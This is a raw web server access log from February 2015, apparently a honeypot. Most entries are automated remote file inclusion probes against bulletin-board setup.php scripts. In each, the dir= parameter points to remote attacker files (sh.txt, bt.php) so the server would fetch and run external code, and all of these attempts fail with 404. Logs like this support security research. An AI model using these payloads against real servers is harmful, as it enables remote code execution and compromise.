71.6.150.241 - - [14/Feb/2015:15:23:58 -0800] "POST ////bbs/skin/minkoon_link_skyblue/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
71.6.150.241 - - [14/Feb/2015:15:23:58 -0800] "GET ////bbs/skin/amick04_lightgreen/setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
71.6.150.241 - - [14/Feb/2015:15:23:58 -0800] "POST ////bbs/skin/amick04_lightgreen/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
71.6.150.241 - - [14/Feb/2015:15:23:59 -0800] "POST ////bbs/skin/ikkelim_bbs05/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
71.6.150.241 - - [14/Feb/2015:15:23:59 -0800] "POST ////bbs/skin/minkoon_link_skyblue/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
71.6.150.241 - - [14/Feb/2015:15:23:59 -0800] "POST ////bbs/skin/amick04_lightgreen/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
112.218.68.155 - - [14/Feb/2015:15:24:40 -0800] "GET ////bbs/skin/ikkelim_bbs05/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
112.218.68.155 - - [14/Feb/2015:15:24:42 -0800] "GET ////bbs/skin/ikkelim_bbs05/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
112.218.68.155 - - [14/Feb/2015:15:24:42 -0800] "POST ////bbs/skin/ikkelim_bbs05/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
112.218.68.155 - - [14/Feb/2015:15:24:43 -0800] "POST ////bbs/skin/ikkelim_bbs05/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
71.6.150.241 - - [14/Feb/2015:15:25:48 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:15:25:49 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:15:25:49 -0800] "POST /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:15:25:51 -0800] "POST /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:15:25:51 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:15:25:52 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:15:25:52 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:15:25:53 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
113.231.210.168 - - [14/Feb/2015:15:27:20 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60" 
66.117.9.219 - - [14/Feb/2015:15:34:59 -0800] "OPTIONS / HTTP/1.1" 200 270 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.0 Safari/537.36" 
71.6.150.241 - - [14/Feb/2015:15:35:20 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:15:35:21 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:15:35:22 -0800] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:15:35:23 -0800] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:15:35:23 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:15:35:24 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:15:35:24 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:15:35:25 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
91.121.6.123 - - [14/Feb/2015:15:39:49 -0800] "GET ////bbs/skin/ikkelim_bbs05/setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
91.121.6.123 - - [14/Feb/2015:15:39:50 -0800] "GET ////bbs/skin/ikkelim_bbs05/setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
91.121.6.123 - - [14/Feb/2015:15:39:51 -0800] "POST ////bbs/skin/ikkelim_bbs05/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
91.121.6.123 - - [14/Feb/2015:15:39:52 -0800] "POST ////bbs/skin/ikkelim_bbs05/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
178.137.84.200 - - [14/Feb/2015:15:49:55 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://dostavka-v-ukrainu.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0; .NET CLR 1.0.2914)" 
178.137.84.200 - - [14/Feb/2015:15:49:56 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://dostavka-v-ukrainu.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0; .NET CLR 1.0.2914)" 
178.137.84.200 - - [14/Feb/2015:15:49:57 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://dostavka-v-ukrainu.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0; .NET CLR 1.0.2914)" 
69.171.156.137 - - [14/Feb/2015:16:05:00 -0800] "GET / HTTP/1.1" 301 483 "http://buttons-for-website.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
69.171.156.137 - - [14/Feb/2015:16:05:01 -0800] "GET / HTTP/1.1" 200 6788 "http://buttons-for-website.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
69.171.156.137 - - [14/Feb/2015:16:05:01 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
176.31.252.38 - - [14/Feb/2015:16:10:32 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929" 
176.31.252.38 - - [14/Feb/2015:16:10:33 -0800] "POST /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929" 
176.31.252.38 - - [14/Feb/2015:16:10:34 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929" 
176.31.252.38 - - [14/Feb/2015:16:10:36 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929" 
176.31.252.38 - - [14/Feb/2015:16:30:34 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
176.31.252.38 - - [14/Feb/2015:16:30:36 -0800] "POST /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
176.31.252.38 - - [14/Feb/2015:16:30:37 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
176.31.252.38 - - [14/Feb/2015:16:30:38 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
176.31.252.38 - - [14/Feb/2015:16:31:53 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [14/Feb/2015:16:31:53 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [14/Feb/2015:16:31:54 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [14/Feb/2015:16:31:54 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [14/Feb/2015:16:31:54 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [14/Feb/2015:16:31:54 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
91.121.6.123 - - [14/Feb/2015:16:31:55 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [14/Feb/2015:16:31:55 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [14/Feb/2015:16:31:56 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
91.121.6.123 - - [14/Feb/2015:16:31:56 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [14/Feb/2015:16:31:56 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [14/Feb/2015:16:31:56 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [14/Feb/2015:16:31:57 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [14/Feb/2015:16:31:58 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [14/Feb/2015:16:31:58 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [14/Feb/2015:16:31:59 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
71.6.150.241 - - [14/Feb/2015:16:32:19 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:16:32:19 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:16:32:20 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:16:32:20 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:16:32:20 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:16:32:20 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:16:32:21 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [14/Feb/2015:16:32:22 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
112.218.68.155 - - [14/Feb/2015:16:32:51 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
112.218.68.155 - - [14/Feb/2015:16:32:53 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
112.218.68.155 - - [14/Feb/2015:16:32:53 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
112.218.68.155 - - [14/Feb/2015:16:32:55 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
176.31.252.38 - - [14/Feb/2015:16:32:56 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [14/Feb/2015:16:32:56 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [14/Feb/2015:16:32:57 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [14/Feb/2015:16:32:57 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
112.175.50.226 - - [14/Feb/2015:16:32:58 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
176.31.252.38 - - [14/Feb/2015:16:32:59 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [14/Feb/2015:16:33:00 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
112.175.50.226 - - [14/Feb/2015:16:33:00 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
176.31.252.38 - - [14/Feb/2015:16:33:00 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
112.175.50.226 - - [14/Feb/2015:16:33:00 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
176.31.252.38 - - [14/Feb/2015:16:33:01 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
112.175.50.226 - - [14/Feb/2015:16:33:02 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
112.175.50.226 - - [14/Feb/2015:16:33:02 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.175.50.226 - - [14/Feb/2015:16:33:03 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.175.50.226 - - [14/Feb/2015:16:33:04 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
180.179.212.185 - - [14/Feb/2015:16:33:05 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)" 
112.175.50.226 - - [14/Feb/2015:16:33:05 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
180.179.212.185 - - [14/Feb/2015:16:33:06 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)" 
180.179.212.185 - - [14/Feb/2015:16:33:07 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)" 
180.179.212.185 - - [14/Feb/2015:16:33:08 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)" 
176.31.252.38 - - [14/Feb/2015:16:34:16 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)" 
176.31.252.38 - - [14/Feb/2015:16:34:17 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)" 
176.31.252.38 - - [14/Feb/2015:16:34:18 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)" 
176.31.252.38 - - [14/Feb/2015:16:34:20 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)" 
80.68.145.110 - - [14/Feb/2015:16:34:25 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
176.31.252.38 - - [14/Feb/2015:16:34:26 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)" 
80.68.145.110 - - [14/Feb/2015:16:34:26 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
80.68.145.110 - - [14/Feb/2015:16:34:26 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
176.31.252.38 - - [14/Feb/2015:16:34:27 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)" 
176.31.252.38 - - [14/Feb/2015:16:34:27 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)" 
80.68.145.110 - - [14/Feb/2015:16:34:28 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
176.31.252.38 - - [14/Feb/2015:16:34:28 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)" 
80.68.145.110 - - [14/Feb/2015:16:34:34 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
71.6.150.241 - - [14/Feb/2015:16:34:43 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (OS/2; U)" 
71.6.150.241 - - [14/Feb/2015:16:34:44 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (OS/2; U)" 
71.6.150.241 - - [14/Feb/2015:16:34:45 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (OS/2; U)" 
71.6.150.241 - - [14/Feb/2015:16:34:46 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (OS/2; U)" 
80.68.145.110 - - [14/Feb/2015:16:34:46 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
80.68.145.110 - - [14/Feb/2015:16:34:46 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
80.68.145.110 - - [14/Feb/2015:16:34:47 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
80.68.145.110 - - [14/Feb/2015:16:34:50 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
